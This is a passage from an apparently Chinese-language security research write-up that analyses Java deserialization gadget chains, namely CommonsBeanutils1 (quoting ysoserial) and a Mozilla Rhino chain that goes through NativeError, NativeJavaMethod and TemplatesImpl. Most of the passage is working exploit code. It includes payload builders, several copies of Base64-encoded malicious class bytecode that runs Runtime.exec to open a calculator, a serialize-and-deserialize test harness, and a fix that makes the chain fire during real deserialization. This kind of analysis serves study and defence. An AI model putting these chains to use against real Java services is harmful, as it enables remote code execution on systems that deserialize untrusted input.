EBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABAABAAoACwABAAwAAAAdAAEAAQAAAAUqtwABsQAAAAEADQAAAAYAAQAAAAkAAQAOAA8AAgAMAAAAGQAAAAMAAAABsQAAAAEADQAAAAYAAQAAABUAEAAAAAQAAQARAAEADgASAAIADAAAABkAAAAEAAAAAbEAAAABAA0AAAAGAAEAAAAaABAAAAAEAAEAEQAIABMACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAADAAJAA8ADAANAA0ADgAWABAAFAAAAAcAAkwHABUJAAEAFgAAAAIAFw==&quot;);\n\tReflections.setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][] {code});\n \n\tPropertyUtils.getProperty(templatesImpl, &quot;outputProperties&quot;);\n\t// 使用 _outputProperties 不会触发 getOutputProperties 方法\n\t// PropertyUtils.getProperty(templatesImpl, &quot;_outputProperties&quot;);\n}\n成功弹窗，但是如果设置第二个参数为 _outputProperties 则不会。这和 JavaBean 的规范有关，根据规范，_outputProperties 对应的 get 方法应该为 get_outputProperties。\n从前面的测试中可以知道，即使成员 outputProperties 根本不存在，getOutputProperties 方法也会被调用。\n那么根据总结的思路可以构造如下代码\npublic static Object getObject() throws Exception {\n\tTemplatesImpl templatesImpl = new TemplatesImpl();\n \n\tReflections.setFieldValue(templatesImpl, &quot;_name&quot;, &quot;evil&quot;);\n\tReflections.setFieldValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\tbyte[] code =\n\t\tBase64.getDecoder()\n\t\t\t.decode(\n\t\t\t\t&quot;yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEAEUV2aWxUcmFuc2xldC5qYXZhDAAKAAsHACMMACQAJQEAEm9wZW4gLWEgY2FsY3VsYXRvcgwAJgAnAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACgBAAxFdmlsVHJhbnNsZXQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABAABAAoACwABAAwAAAAdAAEAAQAAAAUqtwABsQAAAAEADQAAAAYAAQAAAAkAAQAOAA8AAgAMAAAAGQAAAAMAAAABsQAAAAEADQAAAAYAAQAAABUAEAAAAAQAAQARAAEADgASAAIADAAAABkAAAAEAAAAAbEAAAABAA0AAAAGAAEAAAAaABAAAAAEAAEAEQAIABMACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAADAAJAA8ADAANAA0ADgAWABAAFAAAAAcAAkwHABUJAAEAFgAAAAIAFw==&quot;);\n\tReflections.setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][] {code});\n \n\tBeanComparator&lt;Object&gt; beanComparator = new BeanComparator&lt;&gt;(&quot;integer&quot;);\n \n\tPriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, null);\n\tqueue.add(1);\n\tqueue.add(2);\n \n\tReflections.setFieldValue(queue, &quot;queue&quot;, new Object[]{templatesImpl, 1});\n\tReflections.setFieldValue(queue, &quot;comparator&quot;, beanComparator);\n\tReflections.setFieldValue(beanComparator, &quot;property&quot;, &quot;outputProperties&quot;);\n \n\treturn queue;\n}\n简化版调用关系梳理\nPriorityQueue.readObject();\n  heapify();\n    siftDown(i, (E) queue[i]);\n      // comparator != null 使用 comparator 进行比较\n      siftDownUsingComparator(k, x);\n \n\t\t// 调用 BeanComparator#compare 方法\n        comparator.compare(x, (E) c)；\n          BeanComparator.compare(T o1, T o2);\n            PropertyUtils.getProperty(o1, property);\n              // 调用 getOutputProperties 触发命令执行\n              TemplatesImpl.getOutputProperties()\nysoserial/CommonsBeanutils1\n前面的实现正是 CommonsBeanutils1\npublic Object getObject(final String command) throws Exception {\n\tfinal Object templates = Gadgets.createTemplatesImpl(command);\n\t// mock method name until armed\n\tfinal BeanComparator comparator = new BeanComparator(&quot;lowestSetBit&quot;);\n \n\t// create queue with numbers and basic comparator\n\tfinal PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);\n\t// stub data for replacement later\n\tqueue.add(new BigInteger(&quot;1&quot;));\n\tqueue.add(new BigInteger(&quot;1&quot;));\n \n\t// switch method called by comparator\n\tReflections.setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);\n \n\t// switch contents of queue\n\tfinal Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, &quot;queue&quot;);\n\tqueueArray[0] = templates;\n\tqueueArray[1] = templates;\n \n\treturn queue;\n}\nMozillaRhino\nRhino 是由 Java 实现的 JavaScript 引擎，最初由 Mozilla 开发，后来曾被集成至 JDK 中，此项目进一步扩展了 Java 的动态性，使 Java 可以调用 JS 脚本，实现脚本语言与 Java 语言的数据交换。Rhino 脚本引擎过去已经在 JVM 沙盒逃逸中被滥用（例如 Michael Schierl 的 CVE-2011-3544 和 James Forshaw 的 CVE-2012-3213 。\n\n从 JDK 8 开始 JS 引擎由 Nashorn 提供支持。你可以使用 ScriptEngineManager().getEngineByName(&quot;nashorn/javascript&quot;)\n\n在 Oracle JRE 6/7 中内嵌了 Rhino 的旧分支（位于 sun.org.mozilla.*），Oracle 在 JRE7u13 中对 Rhino 核心类进行了一些强化，使其不再可序列化。这些更改是为了修复 CVE-2012-3213，但是这些更改并没有被纳入 Mozilla 实现的 Rhino 中，或者说没有被纳入 OpenJDK 中，因此该利用链在某些情况下依旧可用。\n\n这条利用链的调用过程和构造都有点复杂。下面使用的 Rhino 版本为 1.7R3，ysoserial 中内嵌的版本为 1.7R2。\n\nScriptableObject$GetterSlot\nRhino 中 JavaScript 对象通常都表示为 ScriptableObject 及其子类的实例，它实现了 Scriptable 接口『所有的 JS 对象都需要直接或间接的实现该接口』，但需要注意 ScriptableObject 是抽象类，无法直接使用。它有两个核心成员 slots 和 prototypeObject\nprivate transient Slot[] slots;\n// 关联的对象原型\nprivate Scriptable prototypeObject;\n在 ScriptableObject 内部有一个 Slot 的实现类，GetterSlot，它重载了 getValue 方法\n@Override\nObject getValue(Scriptable start) {\n\tif (getter != null) {\n\t\tif (getter instanceof MemberBox) {\n\t\t\tMemberBox nativeGetter = (MemberBox)getter;\n\t\t\tObject getterThis;\n\t\t\tObject[] args;\n\t\t\tif (nativeGetter.delegateTo == null) {\n\t\t\t\tgetterThis = start;\n\t\t\t\targs = ScriptRuntime.emptyArgs;\n\t\t\t} else {\n\t\t\t\tgetterThis = nativeGetter.delegateTo;\n\t\t\t\targs = new Object[] { start };\n\t\t\t}\n\t\t\treturn nativeGetter.invoke(getterThis, args); // [9] 动态调用方法\n\t\t} else {\n\t\t\tFunction f = (Function)getter;\n\t\t\tContext cx = Context.getContext();\n\t\t\treturn f.call(cx, f.getParentScope(), start,\n\t\t\t\t\t\t  ScriptRuntime.emptyArgs);\n\t\t}\n\t}\n\tif (value instanceof LazilyLoadedCtor) {\n\t\tLazilyLoadedCtor initializer = (LazilyLoadedCtor)value;\n\t\ttry {\n\t\t\tinitializer.init();\n\t\t} finally {\n\t\t\tvalue = initializer.getValue();\n\t\t}\n\t}\n\treturn value;\n}\n查看 getValue 方法，在 [9] 中会调用 MemberBox#invoke 方法，此方法的实现如下\nObject invoke(Object target, Object[] args) {\n\tMethod method = method();\n\ttry {\n\t\ttry {\n\t\t\treturn method.invoke(target, args);\n看到着你大概就能明白一点了，MemberBox 存在方法的动态调用，也许能够利用这一点构造利用链。\n那么哪里能调用到 GetterSlot#getValue 方法？先在 ScriptableObject 内部搜寻，可以找到如下调用链\ngetProperty(Scriptable obj, String name)\n  get(String name, Scriptable start)\n    getImpl(name, 0, start);\n      slot.getValue(start);\n但是查看 ScriptableObject#readObject，并没有直接能调用到以上任意一个方法的地方，甚至没有过多的方法调用。而且 ScriptableObject 是抽象类不能直接实例化的，为此可以看看它的子类。\nSlots 反序列化时可控吗\nslots 被标记为 transient 默认情况下序列化时不会写入流中，但是查看 ScriptableObject#writeObject/readObject 方法，能够看到 slots 中的内容依旧会被写入流中。只不过是从 firstAdded 开始从链表中顺序读取并写入。所以不影响利用链的构建\nprivate synchronized void writeObject(ObjectOutputStream out)\n\tthrows IOException\n{\n\tout.defaultWriteObject();\n\t// ...\n\t\tout.writeInt(slots.length);\n\t\tSlot slot = firstAdded;\n\t\twhile (slot != null &amp;&amp; slot.wasDeleted) {\n\t\t\t// as long as we&#039;re traversing the order-added linked list,\n\t\t\t// remove deleted slots\n\t\t\tslot = slot.orderedNext;\n\t\t}\n\t\tfirstAdded = slot;\n\t\twhile (slot != null) {\n\t\t\tout.writeObject(slot);\n\t\t// ...\n}\n \nprivate void readObject(ObjectInputStream in)\n\tthrows IOException, ClassNotFoundException\n{\n\tin.defaultReadObject();\n \n\tint tableSize = in.readInt();\n\tif (tableSize != 0) {\n\t\t// ...\n\t\tslots = new Slot[tableSize]; // 初始化 slots 数组\n\t\tint objectsCount = count;\n\t\tSlot prev = null;\n\t\tfor (int i=0; i != objectsCount; ++i) {\n\t\t\tlastAdded = (Slot)in.readObject(); // 读取 slot\n\t\t\tif (i==0) {\n\t\t\t\tfirstAdded = lastAdded;\n\t\t\t} else {\n\t\t\t\tprev.orderedNext = lastAdded;\n\t\t\t}\n\t\t\tint slotIndex = getSlotIndex(tableSize, lastAdded.indexOrHash);\n\t\t\taddKnownAbsentSlot(slots, lastAdded, slotIndex); // 插入 slots\n\t\t\tprev = lastAdded;\n\t\t}\n\t}\n}\nNativeError\nNativeError 是 ScriptableObject 的子类之一，但它并不是直接继承的的 ScriptableObject 而是继承了 ScriptableObject 的子类 IdScriptableObject\n重点在 NativeError#toString 方法中\n@Override\npublic String toString()\n{\n\t// According to spec, Error.prototype.toString() may return undefined.\n\tObject toString =  js_toString(this); // [10] 参数为 this，类型 NativeError\n\treturn toString instanceof String ? (String) toString : super.toString();\n}\n \nprivate static Object js_toString(Scriptable thisObj) {\n\tObject name = ScriptableObject.getProperty(thisObj, &quot;name&quot;);\n可以看到 js_toString 中会调用 ScriptableObject#getProperty 方法，而这个方法能够间接调用到 GetterSlot#getValue 方法。\n至于如何在反序列化时调用 toString 方法，可以使用前面提到的 BadAttributeValueExpException 利用链。\n到了这里是不是整个调用链就串联起来了？还不够，现实没有那么美好，回看 ScriptableObject#getValue 方法\nObject getValue(Scriptable start) {\n\tif (getter != null) {\n\t\tif (getter instanceof MemberBox) {\n\t\t\tMemberBox nativeGetter = (MemberBox)getter;\n\t\t\tObject getterThis;\n\t\t\tObject[] args;\n\t\t\tif (nativeGetter.delegateTo == null) {\n\t\t\t\tgetterThis = start;\n\t\t\t\targs = ScriptRuntime.emptyArgs;\n\t\t\t} else {\n\t\t\t\tgetterThis = nativeGetter.delegateTo;\n\t\t\t\targs = new Object[] { start };\n\t\t\t}\n\t\t\treturn nativeGetter.invoke(getterThis, args);\n对象 getterThis 值是否可控呢？答案是不完全可控，因为按照前面的分析 [10]，它只能是 NativeError，但是纵观整个 NativeError 都没有可以拿来执行命令或代码等方法。而且需要注意能够被调用的方法，参数要么是空，要么类型与 Scriptable 兼容。\n但是不着急，这个方法给了第二个选择，Function\n@Override\nObject getValue(Scriptable start) {\n\tif (getter != null) {\n\t\tif (getter instanceof MemberBox) {\n\t\t\t// ...\n\t\t} else {\n\t\t\tFunction f = (Function)getter;\n\t\t\tContext cx = Context.getContext();\n\t\t\treturn f.call(cx, f.getParentScope(), start,\n\t\t\t\t\t\t  ScriptRuntime.emptyArgs);\n\t\t}\n\t}\nFunction 接口是所有 JS 中的方法都需要实现的接口。\n\nThis is interface that all functions in JavaScript must implement. The interface provides for calling functions and constructors.\n\nNativeJavaMethod\n但最有意思的是 Rhino 引擎支持在 JS 中调用 Java 方法，这点和 BeanShell 类似。Function 的实现类 NativeJavaMethod 则用于表示 Java 方法，内部通过反射机制进行调用。\n查看 NativeJavaMethod#call 方法，\n@Override\npublic Object call(Context cx, Scriptable scope, Scriptable thisObj,\n\t\t\t\t   Object[] args)\n{\n\t// Find a method that matches the types given.\n\tif (methods.length == 0) {\n\t\tthrow new RuntimeException(&quot;No methods defined for call&quot;);\n\t}\n \n\tint index = findFunction(cx, methods, args);\n\t// ...\n \n\tMemberBox meth = methods[index];\n\tClass&lt;?&gt;[] argTypes = meth.argTypes;\n \n\t// 参数转换为 Java 中的类型\n\tif (meth.vararg) {\n\t\t// ...\n\t} else {\n\t\t// First, we marshall the args.\n\t\t// ...\n\t}\n\tObject javaObject;\n\tif (meth.isStatic()) {\n\t\tjavaObject = null;  // don&#039;t need an object\n\t} else {\n\t\tScriptable o = thisObj;\n\t\tClass&lt;?&gt; c = meth.getDeclaringClass();\n\t\tfor (;;) {\n\t\t\tif (o == null) {\n\t\t\t\tthrow Context.reportRuntimeError3(\n\t\t\t\t\t&quot;msg.nonjava.method&quot;, getFunctionName(),\n\t\t\t\t\tScriptRuntime.toString(thisObj), c.getName());\n\t\t\t}\n\t\t\tif (o instanceof Wrapper) {\n\t\t\t\tjavaObject = ((Wrapper)o).unwrap();\n\t\t\t\tif (c.isInstance(javaObject)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\to = o.getPrototype();\n\t\t}\n\t}\n \n\tObject retval = meth.invoke(javaObject, args); // [11] 调用方法 meth\n\t// ...\n}\n先查看 [11] 中的 javaObject 是否可控，观察上下文， javaObject 有两种可能来源：\n\n直接来自 o.unwrap()，\n先调用 thisObj.getPrototype() （如果 o 没有实现 Wrapper 接口），再调用 o.unwrap()，\n\n如果 thisObj 为 NativeError，那么实际调用的就是 ScriptableObject#getPrototype （因为 NativeError 没有自己实现 Wrapper，为第二种情况）\npublic Scriptable getPrototype() {\n\treturn prototypeObject;\n}\n方法返回的就是前面提到成员 prototypeObject，参数呢？固定为 ScriptRuntime.emptyArgs = new Object[0]。而方法 meth 则来自 NativeJavaMethod 的成员 methods。\n也就是说找到一个能够触发命令执行的类的无参方法就基本拼接起一整条的利用链了。这一点可以使用 TemplatesImpl 利用链 。\nNativeJavaObject\n前面提到了 ScriptableObject 的成员 prototypeObject，它的类型为 Scriptable。这里需要找一个 Wrapper 的实现类，它也实现了 Scriptable，并且 unwrap 方法返回的对象可控。\n它就是 NativeJavaObject，实现了 Serializable 接口，unwrap 方法则是直接返回成员 javaObject。\npublic Object unwrap() {\n\treturn javaObject;\n}\n所以可以将 NativeError 的成员 prototypeObject 设置为一个 NativeJavaObject 对象。\nRhinoExec.java\n有了前面的基础，就可以开始尝试构造利用链了，这里需要注意到地方 NativeError 是内部类，外部无法直接访问，需要用到 Class#forName。\n在第一次分析完后，花了点时间写了如下的构造代码，整个过程不算很顺利，因为很多类无法直接访问，需要大量使用反射。\npublic static Object getObject() throws Exception {\n\tClass&lt;?&gt; nativeErrorClass = Class.forName(&quot;org.mozilla.javascript.NativeError&quot;);\n\tScriptableObject nativeError =\n\t\t(ScriptableObject) Reflections.createWithoutConstructor(nativeErrorClass);\n \n\t// 通过 ScriptableObject.getSlot 方法构造并赋值\n\t// 第三个参数设置为 4，创建的才会是 GetterSlot\n\tObject slot = Reflections.getMethod(ScriptableObject.class, &quot;getSlot&quot;, String.class, int.class, int.class)\n\t\t.invoke(nativeError, &quot;name&quot;, 0, 4);\n \n\t// 设定动态调用的方法为 TemplatesImpl#newTransformer\n\tMethod templateMethod = Reflections.getMethod(TemplatesImpl.class, &quot;newTransformer&quot;);\n \n\t// 创建 NativeJavaMethod\n\tNativeJavaMethod nativeJavaMethod = new NativeJavaMethod(templateMethod, &quot;exec&quot;);\n\tReflections.setFieldValue(slot, &quot;getter&quot;, nativeJavaMethod);\n \n\t// TemplatesImpl 利用链\n\tTemplatesImpl templatesImpl = new TemplatesImpl();\n\tReflections.setFieldValue(templatesImpl, &quot;_name&quot;, &quot;evil&quot;);\n\tReflections.setFieldValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\tbyte[] code =\n\t\tBase64.getDecoder()\n\t\t\t.decode(\n\t\t\t\t&quot;yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEAEUV2aWxUcmFuc2xldC5qYXZhDAAKAAsHACMMACQAJQEAEm9wZW4gLWEgY2FsY3VsYXRvcgwAJgAnAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACgBAAxFdmlsVHJhbnNsZXQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABAABAAoACwABAAwAAAAdAAEAAQAAAAUqtwABsQAAAAEADQAAAAYAAQAAAAkAAQAOAA8AAgAMAAAAGQAAAAMAAAABsQAAAAEADQAAAAYAAQAAABUAEAAAAAQAAQARAAEADgASAAIADAAAABkAAAAEAAAAAbEAAAABAA0AAAAGAAEAAAAaABAAAAAEAAEAEQAIABMACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAADAAJAA8ADAANAA0ADgAWABAAFAAAAAcAAkwHABUJAAEAFgAAAAIAFw==&quot;);\n\tReflections.setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][] {code});\n \n\t// 创建 NativeJavaObject\n\tContext context = Context.enter();\n\tNativeObject scriptableObject = (NativeObject) context.initStandardObjects();\n\tNativeJavaObject nativeJavaObject = new NativeJavaObject(scriptableObject, templatesImpl, TemplatesImpl.class);\n\tReflections.setFieldValue(nativeError, &quot;prototypeObject&quot;, nativeJavaObject);\n \n\tBadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);\n \n\tReflections.setFieldValue(badAttributeValueExpException, &quot;val&quot;, nativeError);\n \n\treturn badAttributeValueExpException;\n}\n兴高采烈的用如下代码测试\npublic static void main(String[] args) throws Exception {\n\tObjectOutputStream oos =\n\t\tnew ObjectOutputStream(\n\t\t\tFiles.newOutputStream(Paths.get(&quot;target/RhinoExec.bin&quot;)));\n\toos.writeObject(getObject());\n \n\tObjectInputStream ois =\n\t\tnew ObjectInputStream(\n\t\t\tFiles.newInputStream(Paths.get(&quot;target/RhinoExec.bin&quot;)));\n\tois.readObject();\n}\n确实成功弹窗了\n\nNo Context 错误\n习惯性注释掉序列化的代码，再次执行时却没有任何内容，而是出现了异常。\nException in thread &quot;main&quot; java.lang.RuntimeException: No Context associated with current Thread\n\tat org.mozilla.javascript.Context.getContext(Context.java:2355)\n\tat org.mozilla.javascript.ScriptableObject$GetterSlot.getValue(ScriptableObject.java:338)\nRhino 执行脚本时需要有一个线程相关的 Context，用于存储执行环境的信息，这一点是必须的。创建 Context 最简单的方式如下\nContext cx = Context.enter();\n// 执行完脚本后通过 exit 方法退出\nContext.exit();\n而前面的代码中，只有 getObject 方法会调用 Context.enter()，而这只在序列化时被调用了。所以在反序列化前的代码中，加一行 Context.enter(); 就可以了，但这样实战意义就不大了，有没有办法在反序列化时先调用 Context#enter，再执行命令？\nMozillaRhinoBadAttributeValueExpExceptionExec.java\n前面已经提到，有能力在反序化时动态调用方法了，而 Context#enter 方法刚好也是无参的，满足调用条件。但是还有一个问题，得保证链条被调用两次，至少在 GetterSlot#getValue 被调用前。\n回看 NativeError#js_toString 方法，它刚好有调用 ScriptableObject.getProperty 两次。\nprivate static Object js_toString(Scriptable thisObj) {\n\tObject name = ScriptableObject.getProperty(thisObj, &quot;name&quot;); // 第一次调用\n\tif (name == NOT_FOUND || name == Undefined.instance) {\n\t\tname = &quot;Error&quot;;\n\t} else {\n\t\tname = ScriptRuntime.toString(name);\n\t}\n\tObject msg = ScriptableObject.getProperty(thisObj, &quot;message&quot;); // 第二次调用\n所以只要让第一次调用去执行 Context#enter，第二次再执行具备攻击性的方法。要注意一点，第一次调用到第二次调用之间不要出现异常或错误，否则会失败。\n另外异常的触发点位于 getValue 方法中的 Function 的调用前，所以，无法使用 Function 调用 Context#enter 方法，这里需要直接使用 MemberBox\n@Override\nObject getValue(Scriptable start) {\n\tif (getter != null) {\n\t\tif (getter instanceof MemberBox) {\n\t\t\tMemberBox nativeGetter = (MemberBox)getter;\n\t\t\tObject getterThis;\n\t\t\tObject[] args;\n\t\t\tif (nativeGetter.delegateTo == null) {\n\t\t\t\tgetterThis = start;\n\t\t\t\targs = ScriptRuntime.emptyArgs;\n\t\t\t} else {\n\t\t\t\tgetterThis = nativeGetter.delegateTo;\n\t\t\t\targs = new Object[] { start };\n\t\t\t}\n\t\t\treturn nativeGetter.invoke(getterThis, args);\n\t\t} else {\n\t\t\tFunction f = (Function)getter;\n\t\t\tContext cx = Context.getContext();\n\t\t\treturn f.call(cx, f.getParentScope(), start,\n\t\t\t\t\t\t  ScriptRuntime.emptyArgs);\n\t\t}\n\t}\n由于 Context#enter 是一个静态方法，所以即使 getterThis 类型为 NativeError 也不会有影响。下面为修改后的代码\npublic static Object getObject() throws Exception {\n\tClass&lt;?&gt; nativeErrorClass = Class.forName(&quot;org.mozilla.javascript.NativeError&quot;);\n\tScriptableObject nativeError =\n\t\t\t(ScriptableObject) Reflections.createWithoutConstructor(nativeErrorClass);\n \n\t// 创建第一个 GetterSlot 调用 `Context#enter` 方法\n\t// 第一个参数为 &quot;name&quot; 因为 js_toString 中 ScriptableObject#getProperty 的第二个参数为 name；第三个参数设置为 4，创建的才会是\n\t// GetterSlot\n\tObject nameSlot =\n\t\tReflections.getMethod(\n\t\t\t\tScriptableObject.class,\n\t\t\t\t&quot;getSlot&quot;,\n\t\t\t\tString.class,\n\t\t\t\tint.class,\n\t\t\t\tint.class)\n\t\t\t.invoke(nativeError, &quot;name&quot;, 0, 4);\n\t// 设定动态调用的方法为 Context#enter\n\tMethod enterMethod = Reflections.getMethod(Context.class, &quot;enter&quot;);\n\t// 创建 MemberBox\n\tClass&lt;?&gt; memberBoxErrorClass = Class.forName(&quot;org.mozilla.javascript.MemberBox&quot;);\n\tObject memberBox = Reflections.createWithoutConstructor(memberBoxErrorClass);\n\tReflections.getMethod(memberBoxErrorClass, &quot;init&quot;, Method.class).invoke(memberBox, enterMethod);\n\tReflections.setFieldValue(nameSlot, &quot;getter&quot;, memberBox);\n \n\t// 创建第二个 GetterSlot 调用 `TemplatesImpl#newTransformer` 方法\n\t// 第一个参数为 &quot;message&quot; 因为 js_toString 中 ScriptableObject#getProperty 的第二个参数为 message；第三个参数设置为 4，创建的才会是\n\t// GetterSlot\n\tObject messageSlot =\n\t\t\tReflections.getMethod(\n\t\t\t\t\t\t\tScriptableObject.class,\n\t\t\t\t\t\t\t&quot;getSlot&quot;,\n\t\t\t\t\t\t\tString.class,\n\t\t\t\t\t\t\tint.class,\n\t\t\t\t\t\t\tint.class)\n\t\t\t\t\t.invoke(nativeError, &quot;message&quot;, 0, 4);\n \n\t// 设定动态调用的方法为 TemplatesImpl#newTransformer\n\tMethod templateMethod = Reflections.getMethod(TemplatesImpl.class, &quot;newTransformer&quot;);\n \n\t// 创建 NativeJavaMethod\n\tNativeJavaMethod transformerJavaMethod = new NativeJavaMethod(templateMethod, &quot;templates&quot;);\n\tReflections.setFieldValue(messageSlot, &quot;getter&quot;, transformerJavaMethod);\n \n\t// TemplatesImpl 利用链\n\tTemplatesImpl templatesImpl = new TemplatesImpl();\n\tReflections.setFieldValue(templatesImpl, &quot;_name&quot;, &quot;evil&quot;);\n\tReflections.setFieldValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\tbyte[] code =\n\t\t\tBase64.getDecoder()\n\t\t\t\t\t.decode(\n\t\t\t\t\t\t\t&quot;yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEAEUV2aWxUcmFuc2xldC5qYXZhDAAKAAsHACMMACQAJQEAEm9wZW4gLWEgY2FsY3VsYXRvcgwAJgAnAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACgBAAxFdmlsVHJhbnNsZXQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABAABAAoACwABAAwAAAAdAAEAAQAAAAUqtwABsQAAAAEADQAAAAYAAQAAAAkAAQAOAA8AAgAMAAAAGQAAAA